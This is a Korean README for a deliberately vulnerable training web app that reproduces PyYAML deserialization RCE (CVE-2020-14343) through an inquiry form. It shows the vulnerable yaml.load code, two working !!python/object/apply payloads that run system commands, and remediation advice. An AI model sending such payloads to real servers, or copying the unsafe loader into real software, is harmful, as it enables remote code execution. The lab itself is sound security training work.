# 1x INV - PyYAML 역직렬화 RCE 취약점 실습 환경

## 📋 개요

이 프로젝트는 **PyYAML 역직렬화 RCE 취약점 (CVE-2020-14343)** 실습을 위한 웹 애플리케이션입니다.

자동차 네비게이션/OTA 솔루션 회사 웹사이트를 모방하여, 문의하기 기능에서 취약점을 재현합니다.

## 🔓 취약점 설명

### CVE-2020-14343: PyYAML 안전하지 않은 역직렬화

- **취약한 함수**: `yaml.load(data, Loader=yaml.Loader)`
- **위험도**: HIGH
- **영향**: 원격 코드 실행 (RCE) 가능
- **발생 위치**: 문의하기 제목에 `.yaml` 확장자를 붙여 제출할 때

### 취약점 동작 원리

1. 사용자가 문의하기 양식에서 제목에 `.yaml` 확장자를 포함하여 제출
2. PHP 백엔드가 제목의 확장자를 기반으로 파일 형식 결정
3. YAML 파일로 저장 후, Python 스크립트(`parse_yaml.py`)를 호출하여 파싱
4. **취약한 `yaml.load()`** 사용으로 인해 악의적인 YAML 페이로드 실행 가능

## 🚀 실행 방법

### 1. Docker Compose로 실행

```bash
cd website3
docker-compose up -d web
```

### 2. 접속

- 웹사이트: http://localhost:8000
- SUPPORT > 문의하기 메뉴 이용

## 🧪 취약점 테스트 방법

### 1. 정상적인 문의 (JSON 저장)

1. SUPPORT > 문의하기 클릭
2. 제목: "제품 문의" (확장자 없음 또는 `.json`)
3. 나머지 필드 입력 후 제출
4. `inquiries/` 폴더에 JSON 파일로 저장됨

### 2. YAML 파일로 저장 (취약점 발생)

1. SUPPORT > 문의하기 클릭
2. 제목: **"긴급 문의.yaml"** (`.yaml` 확장자 포함)
3. 내용:
```
일반 문의 내용
```
4. 제출 시 YAML 파일로 저장됨
5. 문의 내역 클릭 시 Python으로 파싱되며 취약점 발생

### 3. 악의적인 페이로드 (RCE)

**⚠️ 교육 목적으로만 사용하세요!**

1. 제목: **"테스트.yaml"**
2. 내용:
```yaml
!!python/object/apply:os.system
args: ['whoami']
```

또는:

```yaml
!!python/object/apply:subprocess.check_output
args: [['ls', '-la', '/var/www/html']]
```

3. 제출 후 문의 상세보기 클릭
4. Python 스크립트가 YAML 파싱 시 시스템 명령어 실행

## 📂 파일 구조

```
website3/
├── index.php               # 메인 페이지
├── support.php             # 지원 페이지 (FAQ + 문의하기)
├── inquiry-form.php        # 문의 작성 폼
├── parse_yaml.py           # PyYAML 파싱 스크립트 (취약점 포함)
├── api/
│   ├── submit_inquiry.php        # 문의 제출 API
│   ├── get_inquiries.php         # 문의 목록 조회 API
│   └── get_inquiry_detail.php    # 문의 상세 조회 API (YAML 파싱)
├── inquiries/              # 문의 저장 폴더 (JSON/YAML)
├── uploads/                # 첨부 파일 저장 폴더
├── Dockerfile              # Docker 이미지 (Python3 + PyYAML 포함)
└── docker-compose.yml      # Docker Compose 설정
```

## 🎯 취약점 포인트

### 1. [submit_inquiry.php](api/submit_inquiry.php:121-174)
```php
// 제목에서 확장자 추출
$subject = trim($data['subject']);
$subject_info = pathinfo($subject);
$file_extension = isset($subject_info['extension']) ? strtolower($subject_info['extension']) : 'json';

// YAML 파일로 저장
if ($file_extension === 'yaml' || $file_extension === 'yml') {
    $yaml_content = "...";
    file_put_contents($inquiry_path, $yaml_content);
}
```

### 2. [get_inquiry_detail.php](api/get_inquiry_detail.php:46-62)
```php
elseif ($extension === 'yaml' || $extension === 'yml') {
    // Python 스크립트로 YAML 파싱 (취약점!)
    $python_script = __DIR__ . '/../parse_yaml.py';
    $command = "python3 " . escapeshellarg($python_script) . " " . escapeshellarg($file_path);
    $output = shell_exec($command . " 2>&1");
    $inquiry = json_decode($output, true);
}
```

### 3. [parse_yaml.py](parse_yaml.py:20-24)
```python
# VULNERABLE CODE
data = yaml.load(f, Loader=yaml.Loader)
```

## 🛡️ 보안 권장사항

### 1. yaml.safe_load() 사용
```python
# 안전한 코드
data = yaml.safe_load(f)
```

### 2. PyYAML 5.4 이상 사용
```bash
pip install PyYAML>=5.4
```

### 3. 입력 검증
- 파일 확장자 화이트리스트 검증
- 신뢰할 수 없는 출처의 YAML 파싱 금지

### 4. 파일 업로드 제한
- 파일 형식을 사용자가 제어하지 못하도록 설정
- 서버에서 파일 타입 강제 지정

## ⚠️ 주의사항

- **이 실습 환경은 교육 목적으로만 사용하세요**
- 실제 운영 환경에서는 절대 사용하지 마세요
- 컨테이너 내부에서만 실행되므로 호스트 시스템은 격리됨

## 📚 참고 자료

- [CVE-2020-14343](https://nvd.nist.gov/vuln/detail/CVE-2020-14343)
- [PyYAML Security](https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation)
- [OWASP Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
